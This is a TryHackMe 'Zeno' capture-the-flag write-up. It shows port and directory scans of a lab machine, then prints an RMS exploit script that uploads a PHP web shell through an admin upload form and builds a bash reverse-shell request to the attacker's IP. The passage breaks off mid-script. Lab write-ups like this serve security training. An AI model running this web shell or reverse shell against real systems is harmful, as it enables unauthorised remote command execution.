# Zeno — Writeup

## Overview
### Zeno — Writeup
### Zeno — Writeup
----
Do you have the same patience as the great stoic philosopher Zeno? Try it out!
----
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/6aaead7a901eb44de0d69d31d4a6b5ae.jpeg)
Start Machine
Perform a penetration test against a vulnerable machine. Your end-goal is to become the root user and retrieve the two flags:
- /home/{{user}}/user.txt
- /root/root.txt
The machine can take some time to fully boot up, so please be patient! :)
Answer the questions below
The VM is booted up!
Completed

## Flags / Answers
- The flags are always in the same format, where XYZ is a MD5 hash: **THM{XYZ}**
- Good luck!
- Answer the questions below
```text
- ┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.205.36 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Looks like I didn't find any open ports for 10.10.205.36. This is usually caused by a high batch size.
        
*I used 65535 batch size, consider lowering it with 'rustscan -b <batch_size> <ip address>' or a comfortable number for your system.
        
 Alternatively, increase the timeout if your ping is high. Rustscan -t 2000 for 2000 milliseconds (2s) timeout.

┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
└─$ ping 10.10.205.36
PING 10.10.205.36 (10.10.205.36) 56(84) bytes of data.
^C
--- 10.10.205.36 ping statistics ---
71 packets transmitted, 0 received, 100% packet loss, time 71674ms

rebooting

┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.40.10 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.40.10:22
Open 10.10.40.10:12340
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.40.10 [2 ports]
Discovered open port 22/tcp on 10.10.40.10
Discovered open port 12340/tcp on 10.10.40.10
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.40.10
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.40.10.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.40.10
Host is up, received user-set (0.19s latency).

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 092362a2186283690440623297ff3ccd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDakZyfnq0JzwuM1SD3YZ4zyizbtc9AOvhk2qCaTwJHEKyyqIjBaElNv4LpSdtV7y/C6vwUfPS34IO/mAmNtAFquBDjIuoKdw9TjjPrVBVjzFxD/9tDSe+cu6ELPHMyWOQFAYtg1CV1TQlm3p6WIID2IfYBffpfSz54wRhkTJd/+9wgYdOwfe+VRuzV8EgKq4D2cbUTjYjl0dv2f2Th8WtiRksEeaqI1fvPvk6RwyiLdV5mSD/h8HCTZgYVvrjPShW9XPE/wws82/wmVFtOPfY7WAMhtx5kiPB11H+tZSAV/xpEjXQQ9V3Pi6o4vZdUvYSbNuiN4HI4gAWnp/uqPsoR
|   256 33663536b0680632c18af601bc4338ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEMyTtxVAKcLy5u87ws+h8WY+GHWg8IZI4c11KX7bOSt85IgCxox7YzOCZbUA56QOlryozIFyhzcwOeCKWtzEsA=
|   256 1498e3847055e6600cc20977f8b7a61c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOKY0jLSRkYg0+fTDrwGOaGW442T5k1qBt7l8iAkcuCk
12340/tcp open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: We&#39;ve got some trouble | 404 - Resource not found
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.76 seconds

┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
└─$ dirsearch -u http://10.10.40.10:12340/ -i200,301,302,401 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30
Wordlist size: 220545

Output File: /home/witty/.dirsearch/reports/10.10.40.10-12340/-_23-07-15_19-13-21.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-07-15_19-13-21.log

Target: http://10.10.40.10:12340/

[19:13:22] Starting: 
[19:15:22] 301 -  237B  - /rms  ->  http://10.10.40.10:12340/rms/

https://github.com/AlperenY-cs/rms_hunt

┌──(witty㉿kali)-[~/Downloads]
└─$ cat rms_hunt.py 
#!/usr/bin/python
import requests as rq
import sys

print(""" 

########  ##     ##  ######          ##     ## ##     ## ##    ## ######## 
##     ## ###   ### ##    ##         ##     ## ##     ## ###   ##    ##    
##     ## #### #### ##               ##     ## ##     ## ####  ##    ##    
########  ## ### ##  ######          ######### ##     ## ## ## ##    ##    
##   ##   ##     ##       ##         ##     ## ##     ## ##  ####    ##    
##    ##  ##     ## ##    ##         ##     ## ##     ## ##   ###    ##    
##     ## ##     ##  ######  ####### ##     ##  #######  ##    ##    ##    

""")

print("""
[!]Usage python3 exploit_file.py target_url 
python3 rms_exploit.py http://xxx.com/rms/ 1234 10.10.10.10
[!]Don't forget to start netcat before running the script!
""")

main_url = sys.argv[1]
port = sys.argv[2]
host_ip = sys.argv[3]
target_path = '/admin/foods-exec.php'
target_url = main_url + target_path

req_header = {

    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0)Gecko/20100101 Firefox/69.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Length": "327",
    "Content-Type": "multipart/form-data;boundary=---------------------------191691572411478",
    "Connection": "close",
    #"Referer": "http://localhost:8081/rms/admin/foods.php", --optional
    "Cookie": "PHPSESSID=4dmIn4q1pvs4b79",
    "Upgrade-Insecure-Requests": "1"

}

req_data = """

-----------------------------191691572411478
Content-Disposition: form-data; name="photo"; filename="shell.php"
Content-Type: text/html

<?php echo shell_exec($_GET["cmd"]); ?>
-----------------------------191691572411478
Content-Disposition: form-data; name="Submit"

Add
-----------------------------191691572411478--

"""

try:

    upload_request = rq.post(target_url, verify=False, headers=req_header, data=req_data)

    encoded_payload_url = main_url + f'images/shell.php?cmd=bash -i >%26 %2fdev%2ftcp%2f{host_ip}%2f{port} 0>%261'

